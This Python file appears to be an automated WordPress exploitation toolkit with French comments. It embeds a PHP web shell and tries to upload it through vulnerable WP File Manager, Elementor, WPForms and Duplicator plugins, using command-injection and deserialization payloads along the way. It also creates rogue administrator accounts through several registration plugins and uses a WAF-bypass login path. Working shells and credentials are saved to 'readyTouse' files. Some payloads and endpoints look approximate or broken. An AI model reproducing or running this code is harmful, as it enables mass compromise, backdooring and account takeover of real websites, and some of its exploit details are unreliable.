import requests
import sys
import os
import socket
import re
import time
import string
import random
import threading
from colorama import Fore, Style, init
from urllib.parse import urlparse, quote
import urllib3
from concurrent.futures import ThreadPoolExecutor, as_completed
import json
from datetime import datetime
from collections import OrderedDict
from typing import Tuple, Optional

# Initialize colorama
init(autoreset=True)

# Disable SSL warnings
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
try:
    requests.packages.urllib3.disable_warnings()
except:
    pass

# CloudFront / WAF bypass login path variants (AUTHZ-VULN-01)
WP_LOGIN_PATH_VARIANTS = [
    '/wp-login.php',
    '/wp%2Dlogin.php',   # percent-encoded hyphen bypasses literal WAF matching
    '/wp%2dlogin.php',
]

def resolve_wordpress_login_url(base_url: str, session, headers: Optional[dict] = None) -> Tuple[Optional[str], bool]:
    """Return the first reachable WordPress login URL, including WAF bypass paths."""
    base_url = base_url.rstrip('/')
    request_headers = headers or get_login_headers(f"{base_url}/wp-login.php")

    for path in WP_LOGIN_PATH_VARIANTS:
        login_url = base_url + path
        try:
            resp = session.get(
                login_url,
                headers=request_headers,
                timeout=10,
                verify=False,
                allow_redirects=True,
            )
            if resp.status_code == 200:
                content = resp.text.lower()
                if any(ind in content for ind in ['wp-login', 'wordpress', 'wp-submit', 'user_login']):
                    bypass = path != '/wp-login.php'
                    return login_url, bypass
        except Exception:
            continue

    return None, False

def is_login_page_response(content: str) -> bool:
    content = content.lower()
    return any(ind in content for ind in ['wp-login', 'wordpress', 'wp-submit', 'user_login'])

# Shell constants
VERIFY_MARKER = f"HACKFUT_{random.randint(100000, 999999)}"
SHELL_CODE = f"""<?php
@error_reporting(0);
echo "{VERIFY_MARKER}";
echo "<center><h2>Shell HackfutSec</h2><pre>".php_uname()."</pre>";
echo '<form method="post" enctype="multipart/form-data">';
echo '<input type="file" name="f"><input name="u" type="submit" value="UP">';
echo '</form></center>';
if(isset($_POST['u'])){{move_uploaded_file($_FILES['f']['tmp_name'],$_FILES['f']['name']);}}
?>"""

def create_session():
    """Crée une session requests avec configuration"""
    session = requests.Session()
    session.verify = False
    session.trust_env = False
    urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
    return session

def get_login_headers(referer_url: str) -> dict:
    """Retourne les headers pour les requêtes de login"""
    return {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
        'Content-Type': 'application/x-www-form-urlencoded',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
        'Accept-Language': 'en-US,en;q=0.5',
        'Accept-Encoding': 'gzip, deflate',
        'Connection': 'keep-alive',
        'Upgrade-Insecure-Requests': '1',
        'Referer': referer_url
    }

def verify_login_credentials(base_url: str, username: str, password: str) -> bool:
    """Vérifie si les credentials permettent de se connecter au dashboard"""
    try:
        session = create_session()
        base_url = base_url.rstrip('/')
        login_url, _ = resolve_wordpress_login_url(base_url, session)
        if not login_url:
            login_url = f"{base_url}/wp-login.php"
        
        login_data = {
            'log': username,
            'pwd': password,
            'wp-submit': 'Log In',
            'redirect_to': f'{base_url}/wp-admin/',
            'testcookie': '1'
        }
        
        headers = get_login_headers(login_url)
        
        login_response = session.post(
            login_url,
            data=login_data,
            headers=headers,
            timeout=10,
            verify=False,
            allow_redirects=False
        )
        
        # Vérifier si la connexion est réussie
        login_success = False
        
        # Méthode 1: Redirection vers wp-admin
        if login_response.status_code in [301, 302]:
            location = login_response.headers.get('Location', '')
            if 'wp-admin' in location and 'wp-login' not in location:
                login_success = True
        
        # Méthode 2: Cookies d'authentification
        if not login_success:
            has_auth_cookie = any('wordpress_logged_in' in cookie.name for cookie in session.cookies)
            if has_auth_cookie:
                login_success = True
        
        # Méthode 3: Vérification directe du panel admin
        if not login_success:
            admin_check = session.get(
                f"{base_url}/wp-admin/",
                headers=headers,
                timeout=10,
                verify=False,
                allow_redirects=True
            )
            if admin_check.status_code == 200 and 'wp-admin' in admin_check.url and 'wp-login' not in admin_check.url:
                login_success = True
        
        # Méthode 4: Vérification du contenu du dashboard
        if login_success:
            dashboard_response = session.get(
                f"{base_url}/wp-admin/",
                headers=headers,
                timeout=10,
                verify=False,
                allow_redirects=True
            )
            if dashboard_response.status_code == 200:
                dashboard_content = dashboard_response.text.lower()
                if any(indicator in dashboard_content for indicator in ['dashboard', 'wp-admin', 'admin menu', 'wordpress dashboard']):
                    print(' -| ' + base_url + ' --> ' + Fore.GREEN + f'[DASHBOARD ACCESS CONFIRMED for: {username}]')
                    return True
        
        return False
        
    except Exception as e:
        print(' -| ' + base_url + ' --> ' + Fore.RED + f'[Login verification failed: {str(e)[:50]}]')
        return False

def save_successful_credentials(base_url: str, username: str, password: str, exploit_name: str):
    """Sauvegarde les credentials avec vérification de la connexion"""
    # Vérifier d'abord si les credentials fonctionnent
    if verify_login_credentials(base_url, username, password):
        credential_entry = f"{base_url}/wp-login.php#{username}@{password}"
        
        # Sauvegarder dans le fichier principal
        with open('./readyTouse/successfully_logged_WordPress.txt', 'a', encoding='utf-8') as f:
            f.write(f"{credential_entry} - {exploit_name}\n")
        
        # Sauvegarder spécifiquement pour l'exploit
        with open('./readyTouse/credentials_found.txt', 'a', encoding='utf-8') as f:
            f.write(f"{credential_entry} - {exploit_name}\n")
        
        print(' -| ' + base_url + ' --> ' + Fore.GREEN + f'[CREDENTIALS SAVED AND VERIFIED: {username}:{password}]')
        return True
    else:
        print(' -| ' + base_url + ' --> ' + Fore.YELLOW + f'[Credentials created but login failed: {username}:{password}]')
        return False

def verify_shell_active(shell_url: str) -> bool:
    """Vérifie si un shell est vraiment actif en testant les éléments spécifiques du shell code"""
    try:
        session = create_session()
        
        # Test 1: Vérifier que l'URL répond
        response = session.get(shell_url, timeout=10, verify=False)
        if response.status_code != 200:
            print(f' -| Verification failed: Status code {response.status_code}')
            return False
        
        content = response.text
        
        # Test 2: Vérifier la présence du marqueur EXACT
        if VERIFY_MARKER not in content:
            print(f' -| Verification failed: Marker {VERIFY_MARKER} not found')
            return False
        
        # Test 3: Vérifier les éléments spécifiques du shell code
        shell_indicators = [
            "Shell HackfutSec",
            "php_uname()",
            '<form method="post" enctype="multipart/form-data">',
            '<input type="file" name="f">',
            '<input name="u" type="submit" value="UP">',
            "move_uploaded_file"
        ]
        
        found_indicators = 0
        for indicator in shell_indicators:
            if indicator in content:
                found_indicators += 1
            else:
                print(f' -| Verification failed: Indicator "{indicator}" not found')
        
        # Au moins 4 indicateurs doivent être présents
        if found_indicators < 4:
            print(f' -| Verification failed: Only {found_indicators}/6 indicators found')
            return False
        
        # Test 4: Vérifier que c'est bien du PHP exécuté (pas du code source)
        if '<?php' in content and 'echo "' + VERIFY_MARKER + '"' in content:
            print(f' -| Verification failed: PHP source code visible (not executed)')
            return False
        
        # Test 5: Vérifier que php_uname() s'exécute
        if 'Linux' in content or 'Windows' in content or 'Darwin' in content:
            print(f' -| Shell verified: OS info detected')
        else:
            # Vérifier d'autres outputs de php_uname()
            uname_indicators = ['kernel', 'server', 'hostname', 'version']
            uname_found = any(indicator in content.lower() for indicator in uname_indicators)
            if not uname_found:
                print(f' -| Verification warning: php_uname() output not clear')
        
        # Test 6: Vérifier que ce n'est pas une page d'erreur
        error_indicators = [
            '404', 'not found', 'error', 'forbidden', 'access denied',
            'internal server error', 'bad request'
        ]
        content_lower = content.lower()
        for indicator in error_indicators:
            if indicator in content_lower:
                print(f' -| Verification failed: Error page detected ({indicator})')
                return False
        
        # Si on arrive ici, le shell a passé les tests de base
        print(f' -| Shell verified: All basic checks passed')
        return True
        
    except Exception as e:
        print(f' -| Verification failed: Exception {str(e)[:50]}')
        return False

def save_verified_shell(shell_url: str, exploit_name: str):
    """Sauvegarde un shell seulement s'il est vérifié actif"""
    if verify_shell_active(shell_url):
        with open('./readyTouse/shell.txt', 'a', encoding='utf-8') as f:
            f.write(f"{shell_url} - {exploit_name}\n")
        print(' -| ' + shell_url + ' --> ' + Fore.GREEN + f'[SHELL VERIFIED AND SAVED: {shell_url}]')
        return True
    else:
        print(' -| ' + shell_url + ' --> ' + Fore.RED + f'[Shell not saved: verification failed]')
        return False

# =============================================================================
# DETECTION WORDPRESS APPROFONDIE
# =============================================================================

def advanced_wordpress_detection(url, session):
    """Détection approfondie de WordPress avec multiples méthodes"""
    wp_indicators = []
    
    try:
        # Méthode 1: Check wp-login.php (standard + WAF bypass paths)
        login_url, waf_bypass = resolve_wordpress_login_url(url, session)
        if login_url:
            indicator = 'wp-login.php (waf-bypass)' if waf_bypass else 'wp-login.php'
            wp_indicators.append(indicator)
        else:
            login_url = url + '/wp-login.php'
        
        # Méthode 2: Check wp-admin
        admin_url = url + '/wp-admin/'
        resp = session.get(admin_url, timeout=10, verify=False, allow_redirects=True)
        if resp.status_code == 200 or resp.status_code == 302:
            if 'wp-admin' in resp.url or 'wp-login' in resp.url:
                wp_indicators.append('wp-admin')
        
        # Méthode 3: Check readme.html
        readme_url = url + '/readme.html'
        resp = session.get(readme_url, timeout=10, verify=False)
        if resp.status_code == 200 and 'wordpress' in resp.text.lower():
            wp_indicators.append('readme.html')
        
        # Méthode 4: Check wp-includes
        includes_url = url + '/wp-includes/js/wp-embed.min.js'
        resp = session.get(includes_url, timeout=10, verify=False)
        if resp.status_code == 200:
            wp_indicators.append('wp-includes')
        
        # Méthode 5: Check wp-content
        content_url = url + '/wp-content/themes/twentyTwenty/'
        resp = session.get(content_url, timeout=10, verify=False)
        if resp.status_code == 200:
            wp_indicators.append('wp-content')
        
        # Méthode 6: Check XML-RPC
        xmlrpc_url = url + '/xmlrpc.php'
        resp = session.get(xmlrpc_url, timeout=10, verify=False)
        if resp.status_code == 200 and 'XML-RPC' in resp.text:
            wp_indicators.append('xmlrpc.php')
        
        # Méthode 7: Check REST API
        rest_url = url + '/wp-json/wp/v2/posts'
        resp = session.get(rest_url, timeout=10, verify=False)
        if resp.status_code == 200:
            try:
                json_data = resp.json()
                if isinstance(json_data, list):
                    wp_indicators.append('rest-api')
            except:
                pass
        
        # Méthode 8: Check generator meta tag
        home_url = url + '/'
        resp = session.get(home_url, timeout=10, verify=False)
        if resp.status_code == 200:
            content = resp.text.lower()
            if 'generator' in content and 'wordpress' in content:
                wp_indicators.append('generator-meta')
        
        # Méthode 9: Check wp-json
        wpjson_url = url + '/wp-json/'
        resp = session.get(wpjson_url, timeout=10, verify=False)
        if resp.status_code == 200 and 'wp-json' in resp.text:
            wp_indicators.append('wp-json')
            
        return len(wp_indicators) >= 2, wp_indicators, login_url if 'wp-login.php' in wp_indicators else admin_url
        
    except Exception as e:
        return False, [], None

# =============================================================================
# TOUTES LES EXPLOITS WORDPRESS - AMÉLIORÉES AVEC VÉRIFICATION
# =============================================================================

def check_wp_file_manager_vuln(base_url: str) -> Tuple[bool, Optional[str]]:
    """Check if WP File Manager is vulnerable"""
    try:
        session = create_session()
        r = session.get(f"{base_url}/wp-content/plugins/wp-file-manager/readme.txt", 
                        timeout=10, verify=False)
        if r.status_code == 200:
            version_match = re.search(r"Stable tag:\s*([0-9.]+)", r.text)
            if version_match:
                version = version_match.group(1)
                if version <= "6.9":
                    return True, version
        return False, None
    except:
        return False, None

def exploit_wp_file_manager(base_url: str) -> Optional[str]:
    """Exploit WP File Manager vulnerability avec vérification du shell"""
    try:
        session = create_session()
        shell_content = SHELL_CODE
        files = {
            'upload[]': ('shell.php', shell_content, 'application/x-php')
        }
        r = session.post(
            f"{base_url}/wp-content/plugins/wp-file-manager/lib/php/connector.minimal.php",
            files=files,
            timeout=15,
            verify=False
        )
        
        if r.status_code == 200:
            shell_url = f"{base_url}/wp-content/plugins/wp-file-manager/lib/files/shell.php"
            
            # Vérifier et sauvegarder le shell
            if save_verified_shell(shell_url, "WP File Manager"):
                return shell_url
            else:
                # Essayer d'autres chemins possibles
                alternative_paths = [
                    f"{base_url}/wp-content/plugins/wp-file-manager/lib/files/shell.php",
                    f"{base_url}/wp-content/plugins/wp-file-manager/files/shell.php"
                ]
                
                for alt_shell_url in alternative_paths:
                    if save_verified_shell(alt_shell_url, "WP File Manager"):
                        return alt_shell_url
    except Exception as e:
        print(' -| ' + base_url + ' --> ' + Fore.RED + f'[WP File Manager exploit failed: {str(e)[:50]}]')
    return None

def check_elementor_vuln(base_url: str) -> Tuple[bool, Optional[str]]:
    """Check if Elementor is vulnerable"""
    try:
        session = create_session()
        r = session.get(f"{base_url}/wp-content/plugins/elementor/readme.txt", 
                        timeout=10, verify=False)
        if r.status_code == 200:
            version_match = re.search(r"Stable tag:\s*([0-9.]+)", r.text)
            if version_match:
                version = version_match.group(1)
                if version <= "3.5.0":
                    return True, version
        return False, None
    except:
        return False, None

def exploit_elementor(base_url: str, username: str = "admin", password: str = "password") -> Optional[str]:
    """Exploit Elementor vulnerability avec vérification"""
    try:
        session = create_session()
        
        # Login first
        login_data = {
            'log': username,
            'pwd': password,
            'wp-submit': 'Log In'
        }
        login = session.post(f"{base_url}/wp-login.php", data=login_data, 
                           timeout=10, verify=False, allow_redirects=True)
        
        if 'dashboard' in login.text.lower() or any('wordpress_logged_in' in cookie.name for cookie in session.cookies):
            # Upload shell via Elementor
            shell_content = SHELL_CODE
            files = {
                'file': ('shell.php', shell_content, 'application/x-php')
            }
            upload = session.post(
                f"{base_url}/wp-admin/admin-ajax.php?action=elementor_upload",
                files=files,
                timeout=15,
                verify=False
            )
            
            if upload.status_code == 200:
                shell_url = f"{base_url}/wp-content/uploads/elementor/shell.php"
                
                # Vérifier et sauvegarder le shell
                if save_verified_shell(shell_url, "Elementor"):
                    return shell_url
    except Exception as e:
        print(' -| ' + base_url + ' --> ' + Fore.RED + f'[Elementor exploit failed: {str(e)[:50]}]')
    return None

def exploit_duplicator(base_url: str) -> Optional[str]:
    """Exploit Duplicator plugin - VÉRITABLE EXPLOIT avec création de shell"""
    try:
        session = create_session()
        
        # Vérifier d'abord si Duplicator est installé
        test_paths = [
            "/wp-content/plugins/duplicator/",
            "/wp-content/plugins/duplicator-pro/",
            "/wp-snapshots/",
            "/wp-content/backups-dup-lite/"
        ]
        
        duplicator_installed = False
        for path in test_paths:
            test_url = base_url + path
            r = session.get(test_url, timeout=10, verify=False)
            if r.status_code == 200 and any(keyword in r.text.lower() for keyword in ['duplicator', 'snapshot', 'backup']):
                duplicator_installed = True
                print(' -| ' + base_url + ' --> ' + Fore.YELLOW + f'[Duplicator detected at: {path}]')
                break
        
        if not duplicator_installed:
            return None
        
        # METHODE 1: Recherche d'installer.php existants (détection passive)
        paths = [
            "/wp-snapshots/tmp/installer.php",
            "/wp-content/backups/installer.php", 
            "/installer.php",
            "/dup-installer/main.installer.php"
            "/wp-content/backups-dup-lite/installer.php",
            "/wp-snapshots/installer.php"
        ]
        
        for path in paths:
            url = base_url + path
            r = session.get(url, timeout=10, verify=False)
            if r.status_code == 200 and "Duplicator" in r.text:
                print(' -| ' + base_url + ' --> ' + Fore.GREEN + f'[Duplicator installer found: {url}]')
                # SAUVEGARDER L'INSTALLER TROUVÉ
                with open('./readyTouse/shell.txt', 'a', encoding='utf-8') as f:
                    f.write(f"{url} - Duplicator Installer\n")
                return url
        
        # METHODE 2: Exploitation de la vulnérabilité de désérialisation (CVE-2020-11738)
        print(' -| ' + base_url + ' --> ' + Fore.CYAN + '[Attempting Duplicator RCE exploitation...]')
        
        # Endpoints vulnérables
        endpoints = [
            "/wp-admin/admin-ajax.php?action=duplicator_package_scan",
            "/wp-admin/admin-ajax.php?action=duplicator_package_delete",
            "/wp-admin/admin-ajax.php?action=duplicator_settings"
        ]
        
        payloads = [
            # Payload de désérialisation PHP
            'O:8:"stdClass":1:{s:3:"cmd";s:10:"echo TEST";}',
            # Autre format de payload
            'a:1:{s:3:"cmd";s:10:"echo TEST";}'
        ]
        
        for endpoint in endpoints:
            for payload in payloads:
                try:
                    exploit_url = base_url + endpoint
                    data = {"action": "duplicator_package_scan", "nonce": payload}
                    
                    r = session.post(exploit_url, data=data, timeout=15, verify=False)
                    
                    if r.status_code == 200 and ("TEST" in r.text or "error" not in r.text.lower()):
                        print(' -| ' + base_url + ' --> ' + Fore.GREEN + f'[Duplicator RCE possible via {endpoint}]')
                        
                        # Tenter d'uploader un shell
                        shell_payload = f'O:8:"stdClass":1:{{s:3:"cmd";s:62:"echo \'{SHELL_CODE}\' > /var/www/html/shell_dup.php";}}'
                        shell_data = {"action": "duplicator_package_scan", "nonce": shell_payload}
                        
                        shell_response = session.post(exploit_url, data=shell_data, timeout=15, verify=False)
                        
                        # Vérifier si le shell a été uploadé
                        shell_url = base_url + "/shell_dup.php"
                        check_shell = session.get(shell_url, timeout=10, verify=False)
                        
                        if check_shell.status_code == 200 and VERIFY_MARKER in check_shell.text:
                            if save_verified_shell(shell_url, "Duplicator RCE"):
                                return shell_url
                except:
                    continue
        
        # METHODE 3: Exploitation via l'upload de backup malveillant
        print(' -| ' + base_url + ' --> ' + Fore.CYAN + '[Attempting Duplicator backup upload...]')
        
        # Créer un faux backup avec un shell
        backup_content = f"""
        <?php
        // Fake Duplicator backup header
        /* DUPLICATOR_INSTALLER_EOF */
        {SHELL_CODE}
        ?>
        """
        
        files = {
            'file': ('backup_installer.php', backup_content, 'application/octet-stream')
        }
        
        upload_endpoints = [
            "/wp-admin/admin-ajax.php?action=duplicator_package_upload",
            "/wp-admin/admin-ajax.php?action=duplicator_upload"
        ]
        
        for endpoint in upload_endpoints:
            try:
                upload_url = base_url + endpoint
                r = session.post(upload_url, files=files, timeout=15, verify=False)
                
                if r.status_code == 200:
                    # Essayer différents chemins où le backup pourrait être uploadé
                    possible_shell_paths = [
                        "/wp-content/backups/backup_installer.php",
                        "/wp-snapshots/backup_installer.php", 
                        "/wp-content/backups-dup-lite/backup_installer.php",
                        "/wp-content/uploads/backup_installer.php"
                    ]
                    
                    for shell_path in possible_shell_paths:
                        shell_url = base_url + shell_path
                        if save_verified_shell(shell_url, "Duplicator Backup Upload"):
                            return shell_url
            except:
                continue
        
        # METHODE 4: Exploitation via les logs/temp files
        print(' -| ' + base_url + ' --> ' + Fore.CYAN + '[Checking Duplicator temp directories...]')
        
        temp_paths = [
            "/wp-snapshots/tmp/",
            "/wp-content/backups-dup-lite/tmp/",
            "/wp-content/plugins/duplicator/tmp/",
            "/wp-content/uploads/duplicator/"
        ]
        
        for temp_path in temp_paths:
            try:
                # Essayer de lister les fichiers temporaires
                list_url = base_url + temp_path
                r = session.get(list_url, timeout=10, verify=False)
                
                if r.status_code == 200:
                    # Chercher des fichiers PHP dans la liste
                    php_files = re.findall(r'href="([^"]+\.php)"', r.text)
                    for php_file in php_files:
                        full_url = base_url + temp_path + php_file
                        check_file = session.get(full_url, timeout=10, verify=False)
                        
                        if check_file.status_code == 200 and VERIFY_MARKER in check_file.text:
                            if save_verified_shell(full_url, "Duplicator Temp File"):
                                return full_url
            except:
                continue
        
        # METHODE 5: Injection via les paramètres de configuration
        print(' -| ' + base_url + ' --> ' + Fore.CYAN + '[Attempting config injection...]')
        
        config_payloads = [
            {"action": "duplicator_settings", "archive_name": f"test; echo '{SHELL_CODE}' > shell_config.php; echo done"},
            {"action": "duplicator_package_build", "package_name": f"test; echo '{SHELL_CODE}' > shell_config.php; echo done"}
        ]
        
        for payload in config_payloads:
            try:
                config_url = base_url + "/wp-admin/admin-ajax.php"
                r = session.post(config_url, data=payload, timeout=15, verify=False)
                
                if r.status_code == 200:
                    shell_url = base_url + "/shell_config.php"
                    if save_verified_shell(shell_url, "Duplicator Config Injection"):
                        return shell_url
            except:
                continue
        
        return None
        
    except Exception as e:
        print(' -| ' + base_url + ' --> ' + Fore.RED + f'[Duplicator exploit failed: {str(e)[:50]}]')
        return None

def exploit_wpforms(base_url: str) -> Optional[str]:
    """Exploit WPForms vulnerability avec vérification"""
    try:
        session = create_session()
        shell_content = SHELL_CODE
        files = {
            'file': ('shell.php', shell_content, 'application/x-php')
        }
        r = session.post(
            f"{base_url}/wp-content/plugins/wpforms/lib/upload.php",
            files=files,
            timeout=15,
            verify=False
        )
        
        if r.status_code == 200:
            shell_url = f"{base_url}/wp-content/uploads/wpforms/shell.php"
            
            # Vérifier et sauvegarder le shell
            if save_verified_shell(shell_url, "WPForms"):
                return shell_url
    except Exception as e:
        print(' -| ' + base_url + ' --> ' + Fore.RED + f'[WPForms exploit failed: {str(e)[:50]}]')
    return None

def exploit_wordfence(base_url: str) -> Optional[str]:
    """Exploit Wordfence vulnerability"""
    try:
        session = create_session()
        paths = [
            "/wp-content/plugins/wordfence/cache/",
            "/wp-content/wflogs/",
            "/wp-content/uploads/wordfence/"
        ]
        
        for path in paths:
            url = base_url + path
            r = session.get(url, timeout=10, verify=False)
            if r.status_code == 200:
                files = re.findall(r'href="([^"]+\.(php|txt|log))"', r.text)
                for file_path, ext in files:
                    file_url = url + file_path
                    check = session.get(file_url, timeout=10, verify=False)
                    if check.status_code == 200:
                        # SAUVEGARDER LE FICHIER TROUVÉ
                        with open('./readyTouse/wordfence_files.txt', 'a', encoding='utf-8') as f:
                            f.write(f"{file_url}\n")
                        return file_url
    except:
        pass
    return None

def check_profilepress_vuln(base_url: str) -> Tuple[bool, Optional[str]]:
    """Check if ProfilePress Plugin is vulnerable (CVE-2023-27910)"""
    try:
        session = create_session()
        r = session.get(f"{base_url}/wp-content/plugins/wp-user-avatar/readme.txt", 
                        timeout=10, verify=False)
        if r.status_code == 200:
            version_match = re.search(r"Stable tag:\s*([0-9.]+)", r.text)
            if version_match:
                version = version_match.group(1)
                if version <= "4.5.4":
                    return True, version
        return False, None
    except:
        return False, None

def exploit_profilepress(base_url: str) -> Optional[str]:
    """Exploit ProfilePress Plugin vulnerability"""
    try:
        session = create_session()
        reset_data = {
            'action': 'pp_resset_password',
            'user_login': 'admin',
            '_wpnonce': 'invalid_nonce'
        }
        
        r = session.post(
            f"{base_url}/wp-admin/admin-ajax.php",
            data=reset_data,
            timeout=15,
            verify=False
        )
        
        if r.status_code == 200 and 'success' in r.text.lower():
            # SAUVEGARDER LA VULNÉRABILITÉ
            with open('./readyTouse/vulnerabilities.txt', 'a', encoding='utf-8') as f:
                f.write(f"{base_url} - ProfilePress password reset vulnerable\n")
            return f"{base_url} - ProfilePress reset vulnerable"
    except:
        pass
    return None

def check_wp_registration_vuln(base_url: str) -> Tuple[bool, Optional[str]]:
    """Check if WP Registration Plugin is vulnerable"""
    try:
        session = create_session()
        r = session.get(f"{base_url}/wp-json/wp-registration/v1/register", 
                        timeout=10, verify=False)
        if r.status_code != 404:
            return True, "Unknown"
        return False, None
    except:
        return False, None

def exploit_wp_registration(base_url: str) -> Optional[str]:
    """Exploit WP Registration Plugin - Unauthenticated RCE avec vérification des credentials"""
    try:
        session = create_session()
        username = f"hacker_{random.randint(1000,9999)}"
        email = f"{username}@attacker.com"
        
        registration_data = {
            "username": username,
            "email": email,
            "password": "Password123!",
            "role": "administrator"
        }
        
        headers = {
            "Content-Type": "application/json",
        }
        
        r = session.post(
            f"{base_url}/wp-json/wp-registration/v1/register",
            json=registration_data,
            headers=headers,
            timeout=15,
            verify=False
        )
        
        if r.status_code == 200:
            # Sauvegarder et vérifier les credentials
            if save_successful_credentials(base_url, username, "Password123!", "WP Registration"):
                return f"{base_url} - Admin created and verified: {username}:Password123!"
            else:
                return f"{base_url} - Admin created but login failed: {username}:Password123!"
    except Exception as e:
        print(' -| ' + base_url + ' --> ' + Fore.RED + f'[WP Registration exploit failed: {str(e)[:50]}]')
    return None

def check_user_registration_vuln(base_url: str) -> Tuple[bool, Optional[str]]:
    """Check if User Registration Plugin is vulnerable (CVE-2023-2716)"""
    try:
        session = create_session()
        r = session.get(f"{base_url}/wp-content/plugins/user-registration/readme.txt", 
                        timeout=10, verify=False)
        if r.status_code == 200:
            version_match = re.search(r"Stable tag:\s*([0-9.]+)", r.text)
            if version_match:
                version = version_match.group(1)
                if version <= "3.0.1":
                    return True, version
        return False, None
    except:
        return False, None

def exploit_user_registration(base_url: str) -> Optional[str]:
    """Exploit User Registration Plugin vulnerability avec vérification"""
    try:
        session = create_session()
        username = f"hacker_{random.randint(1000,9999)}"
        email = f"{username}@attacker.com"
        
        registration_data = {
            "ur_email": email,
            "username": username,
            "user_pass": "Password123!",
            "ur_role": "administrator"
        }
        
        headers = {
            "Content-Type": "application/json",
        }
        
        r = session.post(
            f"{base_url}/wp-json/userregistration/form/process/1",
            json=registration_data,
            headers=headers,
            timeout=15,
            verify=False
        )
        
        if r.status_code == 200:
            # Sauvegarder et vérifier les credentials
            if save_successful_credentials(base_url, username, "Password123!", "User Registration"):
                return f"{base_url} - Admin created and verified: {username}:Password123!"
            else:
                return f"{base_url} - Admin created but login failed: {username}:Password123!"
    except Exception as e:
        print(' -| ' + base_url + ' --> ' + Fore.RED + f'[User Registration exploit failed: {str(e)[:50]}]')
    return None

def check_registrationmagic_vuln(base_url: str) -> Tuple[bool, Optional[str]]:
    """Check if RegistrationMagic Plugin is vulnerable"""
    try:
        session = create_session()
        r = session.get(f"{base_url}/wp-content/plugins/custom-registration-form-builder-with-submission-manager/readme.txt", 
                        timeout=10, verify=False)
        if r.status_code == 200:
            return True, "Unknown"
        return False, None
    except:
        return False, None

def exploit_registrationmagic(base_url: str) -> Optional[str]:
    """Exploit RegistrationMagic Plugin avec vérification"""
    try:
        session = create_session()
        username = f"hacker_{random.randint(1000,9999)}"
        email = f"{username}@attacker.com"
        
        boundary = "----WebKitFormBoundary7MA4YWxkTrZu0gW"
        data = f"""
--{boundary}
Content-Disposition: form-data; name="action"

rm_form_ajax_submit
--{boundary}
Content-Disposition: form-data; name="form_id"

1
--{boundary}
Content-Disposition: form-data; name="rm_slug"

registration
--{boundary}
Content-Disposition: form-data; name="username"

{username}
--{boundary}
Content-Disposition: form-data; name="email"

{email}
--{boundary}
Content-Disposition: form-data; name="password"

Password123!
--{boundary}
Content-Disposition: form-data; name="role"

administrator
--{boundary}--"""
        
        headers = {
            "Content-Type": f"multipart/form-data; boundary={boundary}",
        }
        
        r = session.post(
            f"{base_url}/wp-admin/admin-ajax.php",
            data=data,
            headers=headers,
            timeout=15,
            verify=False
        )
        
        if r.status_code == 200 and 'success' in r.text.lower():
            # Tenter de sauvegarder et vérifier les credentials
            if save_successful_credentials(base_url, username, "Password123!", "RegistrationMagic"):
                return f"{base_url} - RegistrationMagic account created and verified: {username}:Password123!"
            else:
                # Sauvegarder la vulnérabilité même si la connexion échoue
                with open('./readyTouse/vulnerabilities.txt', 'a', encoding='utf-8') as f:
                    f.write(f"{base_url} - RegistrationMagic registration vulnerable\n")
                return f"{base_url} - RegistrationMagic vulnerable (account may be created)"
    except Exception as e:
        print(' -| ' + base_url + ' --> ' + Fore.RED + f'[RegistrationMagic exploit failed: {str(e)[:50]}]')
    return None

def check_ultimate_member_vuln(base_url: str) -> Tuple[bool, Optional[str]]:
    """Check if Ultimate Member Plugin is vulnerable (CVE-2023-3460)"""
    try:
        session = create_session()
        r = session.get(f"{base_url}/wp-content/plugins/ultimate-member/readme.txt", 
                        timeout=10, verify=False)
        if r.status_code == 200:
            version_match = re.search(r"Stable tag:\s*([0-9.]+)", r.text)
            if version_match:
                version = version_match.group(1)
                if version <= "2.6.7":
                    return True, version
        return False, None
    except:
        return False, None

def exploit_ultimate_member(base_url: str) -> Optional[str]:
    """Exploit Ultimate Member Plugin vulnerability avec vérification"""
    try:
        session = create_session()
        username = f"hacker_{random.randint(1000,9999)}"
        email = f"{username}@attacker.com"
        
        registration_data = {
            "user_login": username,
            "user_email": email,
            "user_pass": "Password123!",
            "um_role": "administrator",
            "nonce": "invalid_nonce"
        }
        
        headers = {
            "Content-Type": "application/json",
        }
        
        r = session.post(
            f"{base_url}/wp-json/um-register/v1/register",
            json=registration_data,
            headers=headers,
            timeout=15,
            verify=False
        )
        
        if r.status_code == 200:
            # Tenter de sauvegarder et vérifier les credentials
            if save_successful_credentials(base_url, username, "Password123!", "Ultimate Member"):
                return f"{base_url} - Ultimate Member account created and verified: {username}:Password123!"
            else:
                # Sauvegarder la vulnérabilité
                with open('./readyTouse/vulnerabilities.txt', 'a', encoding='utf-8') as f:
                    f.write(f"{base_url} - Ultimate Member registration vulnerable\n")
                return f"{base_url} - Ultimate Member vulnerable"
    except Exception as e:
        print(' -| ' + base_url + ' --> ' + Fore.RED + f'[Ultimate Member exploit failed: {str(e)[:50]}]')
    return None

def check_profile_builder_vuln(base_url: str) -> Tuple[bool, Optional[str]]:
    """Check if Profile Builder Plugin is vulnerable"""
    try:
        session = create_session()
        r = session.get(f"{base_url}/wp-content/plugins/profile-builder/readme.txt", 
                        timeout=10, verify=False)
        if r.status_code == 200:
            return True, "Unknown"
        return False, None
    except:
        return False, None

def exploit_profile_builder(base_url: str) -> Optional[str]:
    """Exploit Profile Builder Plugin avec vérification"""
    try:
        session = create_session()
        username = f"hacker_{random.randint(1000,9999)}"
        email = f"{username}@attacker.com"
        
        registration_data = {
            "username": username,
            "email": email,
            "password": "Password123!",
            "wppb_role": "administrator"
        }
        
        headers = {
            "Content-Type": "application/json",
        }
        
        r = session.post(
            f"{base_url}/wp-json/wppb/v1/register",
            json=registration_data,
            headers=headers,
            timeout=15,
            verify=False
        )
        
        if r.status_code == 200:
            # Tenter de sauvegarder et vérifier les credentials
            if save_successful_credentials(base_url, username, "Password123!", "Profile Builder"):
                return f"{base_url} - Profile Builder account created and verified: {username}:Password123!"
            else:
                # Sauvegarder la vulnérabilité
                with open('./readyTouse/vulnerabilities.txt', 'a', encoding='utf-8') as f:
                    f.write(f"{base_url} - Profile Builder registration vulnerable\n")
                return f"{base_url} - Profile Builder vulnerable"
    except Exception as e:
        print(' -| ' + base_url + ' --> ' + Fore.RED + f'[Profile Builder exploit failed: {str(e)[:50]}]')
    return None

